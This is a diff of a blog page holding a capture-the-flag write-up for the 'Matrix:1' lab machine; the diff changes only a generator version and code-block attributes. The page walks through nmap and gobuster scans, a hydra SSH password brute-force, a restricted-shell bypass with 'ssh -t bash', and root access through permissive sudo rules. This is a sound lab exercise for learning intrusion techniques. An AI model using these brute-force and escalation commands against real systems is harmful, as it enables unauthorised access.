@@ -5,7 +5,7 @@
 <meta name=viewport content="width=device-width,initial-scale=1">
 <meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
 <meta name=author content="Nasef">
-<meta name=generator content="Hugo 0.87.0">
+<meta name=generator content="Hugo 0.88.1">
 <link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
 <link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
 <link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
@@ -60,7 +60,7 @@ Contact Me
 <p>Matrix:1 is a machine in which I used Enumeration to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.</p>
 <h3 id=scanning>Scanning</h3>
 <p>As always, I started scanning with Nmap</p>
-<pre><code>root@kali:/home/kali# nmap -sC -sV 192.168.198.139
+<pre tabindex=0><code>root@kali:/home/kali# nmap -sC -sV 192.168.198.139
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 00:30 EDT
 Nmap scan report for 192.168.198.139
 Host is up (0.000096s latency).
@@ -83,7 +83,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.96 seconds
 </code></pre><p>Interesting two http services!</p>
 <h3 id=web-enumeration>Web Enumeration</h3>
 <p>Then I enumerated directories and files using gobuster on both services but there is no useful information</p>
-<pre><code>root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.198.139 -x php,html,json,py,matrix
+<pre tabindex=0><code>root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.198.139 -x php,html,json,py,matrix
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
@@ -130,7 +130,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 maker and prefix adder to make my wordlist
 <img src=/images/blog/002/6.png alt=Username></p>
 <p>Then I used hydra to bruteforce the ssh password</p>
-<pre><code>hydra -f -l guest -P Downloads/output.txt ssh://192.168.198.139
+<pre tabindex=0><code>hydra -f -l guest -P Downloads/output.txt ssh://192.168.198.139
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-25 01:13:47
@@ -147,17 +147,17 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-25 01:13:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-25 01:21:21
 </code></pre><h3 id=privilege-escalation>Privilege Escalation</h3>
 <p>When I sshed to the user guest, it gave me a restricted shell so I bypassed the restriction by using this command</p>
-<pre><code>root@kali:/home/kali# ssh guest@192.168.198.139 -t bash
+<pre tabindex=0><code>root@kali:/home/kali# ssh guest@192.168.198.139 -t bash
 
 </code></pre><p>I ran diffreent Enumeration scripts and found an intersting sudo privilege which allows us to run all commands</p>
-<pre><code>guest@porteus:/tmp$ sudo -l
+<pre tabindex=0><code>guest@porteus:/tmp$ sudo -l
 User guest may run the following commands on porteus:
     (ALL) ALL
     (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
     (trinity) NOPASSWD: /bin/cp
 
 </code></pre><p>So</p>
-<pre><code>guest@porteus:/tmp$ sudo su
+<pre tabindex=0><code>guest@porteus:/tmp$ sudo su
 Password: 
 root@porteus:/tmp# cat /root/flag.txt 
    _,-.                                                             
